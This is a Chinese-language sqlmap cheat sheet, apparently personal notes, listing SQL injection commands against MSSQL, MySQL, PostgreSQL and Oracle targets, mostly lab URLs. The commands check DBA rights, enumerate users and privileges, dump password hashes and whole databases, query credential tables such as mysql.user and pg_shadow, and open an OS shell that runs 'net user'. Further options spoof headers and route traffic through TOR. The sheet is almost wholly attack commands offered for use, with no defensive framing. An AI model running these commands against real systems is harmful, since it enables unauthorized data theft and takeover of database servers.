1、实战mssql
	
	判断注入类型 	python sqlmap.py -u 注入点

	判断当前用户是否是dba 	python sqlmap.py -u 注入点 --is-dba -v 1

	列举数据库用户 	python sqlmap.py -u 注入点 --users -v 0

	列举数据库密码	python sqlmap.py -u 注入点 --passwords -v 0
	
	查看用户权限 	python sqlmap.py -u 注入点 --privileges -v 0

	执行命令	python sqlmap.py -u 注入点 --os-shell		-os-cmd=net user
	

2、基本使用
	
	执行SQL语句・python sqlmap.py -u 注入点 -v 1 --sql-shell

	更详细的信息 python sqlmap.py -u 注入点 -v 5

	POST提交     python sqlmap.py -u 文件路径 --method POST --data 参数

	cookie提交   python sqlmap.py -u 文件路径 --cookie 参数 -v 1

	使用referer欺骗  python sqlmap.py -u 注入点 --referer referer地址 -v 3 

	自定义user-agent 或者使用随机自带的user-agents.txt

		python sqlmap.py -u 注入点 --user-agent "自定义" -v 3
		python sqlmap.py -u 注入点 -v 1 -a "./txt/user-agents.txt"

	使用基本认证  python sqlmap.py -u 注入点 --auth-type Basic --auth-cred "testuser:testpass" -v 3

	使用Digest认证  python sqlmap.py -u 注入点 --auth-type Digest --auth-cred "testuser:testpass" -v 3

	使用代理,配合TOR  python sqlmap.py -u 注入点 --proxy 代理ip

	使用多线程猜解	python sqlmap.py -u 注入点 -v 1 --current-user --threads 3

	绕过动态检测,直接指定有注入点的参数,可以使用,分割多个参数,指定user-agent注入


页面比较
python sqlmap.py -u "http://192.168.1.121/sqlmap/mysql/get_int_refresh.php?id=1" --string "luther" -v 1
python sqlmap.py -u "http://192.168.1.121/sqlmap/mysql/get_int_refresh.php?id=1" --regexp "<td>lu[\w][\w]er" -v 

排除网站的内容
python sqlmap.py -u "http://192.168.1.121/sqlmap/mysql/get_int_refresh.php?id=1" --excl-reg "Dynamic content: ([\d]+)"

多语句测试，php内嵌函数mysql_query(),不支持多语句
python sqlmap.py -u "http://192.168.1.121/sqlmap/mysql/get_int.php?id=1" --stacked-test -v 1


union注入测试
python sqlmap.py -u "http://192.168.1.121/sqlmap/oracle/get_int.php?id=1" --union-test -v 1

unionz注入配合orderby
python sqlmap.py -u "http://192.168.1.121/sqlmap/pgsql/get_str.php?id=1" --union-test --union-tech orderby -v 1


python sqlmap.py -u "http://192.168.1.121/sqlmap/mssql/get_int.php?id=1" -v 1 --union-use --banner
python sqlmap.py -u "http://192.168.1.121/sqlmap/mysql/get_int.php?id=1" -v 5 --union-use --current-user
python sqlmap.py -u "http://192.168.1.121/sqlmap/mysql/get_int_partialunion.php?id=1" -v 1 --union-use --dbs

fingerprint
python sqlmap.py -u "http://192.168.1.121/sqlmap/mssql/get_int.php?id=1" -v 1 -f
python sqlmap.py -u "http://192.168.123.36/sqlmap/get_str.asp?name=luther" -v 1 -f -b

判断当前用户是否是dba
python sqlmap.py -u "http://192.168.1.121/sqlmap/pgsql/get_int.php?id=1" --is-dba -v 1

列举数据库用户
python sqlmap.py -u "http://192.168.1.121/sqlmap/pgsql/get_int.php?id=1" --users -v 0

列举数据库用户密码
python sqlmap.py -u "http://192.168.1.121/sqlmap/mysql/get_int.php?id=1" --passwords -v 0
python sqlmap.py -u "http://192.168.1.121/sqlmap/mssql/get_int.php?id=1" --passwords -U sa -v 0


查看用户权限
python sqlmap.py -u "http://192.168.1.121/sqlmap/oracle/get_int.php?id=1" --privileges -v 0
python sqlmap.py -u "http://192.168.1.121/sqlmap/pgsql/get_int.php?id=1" --privileges -U postgres -v 0

列数据库
python sqlmap.py -u "http://192.168.1.121/sqlmap/mssql/get_int.php?id=1" --dbs -v 0

列表的名字
python sqlmap.py -u "http://192.168.1.121/sqlmap/mysql/get_int.php?id=1" --tabless -D test -v 0

列出指定数据库指定表的列名
python sqlmap.py -u "http://192.168.1.121/sqlmap/mysql/get_int.php?id=1" --columns -T users -D test -v 1

列出指定数据库的指定表的指定列的内容
python sqlmap.py -u "http://192.168.1.121/sqlmap/mssql/get_int.php?id=1" --dump -T users -D master -C surname -v 0

指定列的范围从2－4
python sqlmap.py -u "http://192.168.1.121/sqlmap/mysql/get_int.php?id=1" --dump -T users -D test --start 2 --stop 4 -v 0

导出所有数据库，所有表的内容
python sqlmap.py -u "http://192.168.1.121/sqlmap/mysql/get_int.php?id=1" --dump-all -v 0

只列出用户自己新建的数据库和表的内容
python sqlmap.py -u "http://192.168.1.121/sqlmap/mssql/get_int.php?id=1" --dump-all --exclude-sysdbs -v 0

sql query
python sqlmap.py -u "http://192.168.1.121/sqlmap/pgsql/get_int.php?id=1" --sql-query "SELECT usename FROM pg_user" -v 0
python sqlmap.py -u "http://192.168.1.121/sqlmap/mysql/get_int.php?id=1" --sql-query "SELECT host, password FROM mysql.user LIMIT 1, 3" -v 1

SELECT usename, passwd FROM pg_shadow ORDER BY usename

保存和恢复会话
python sqlmap.py -u "http://192.168.1.121/sqlmap/pgsql/get_int.php?id=1" -b -v 1 -s "sqlmap.log"

保存选项到INC配置文件
python sqlmap.py -u "http://192.168.1.121/sqlmap/pgsql/get_int.php?id=1" -b -v 1 --save
		
		
	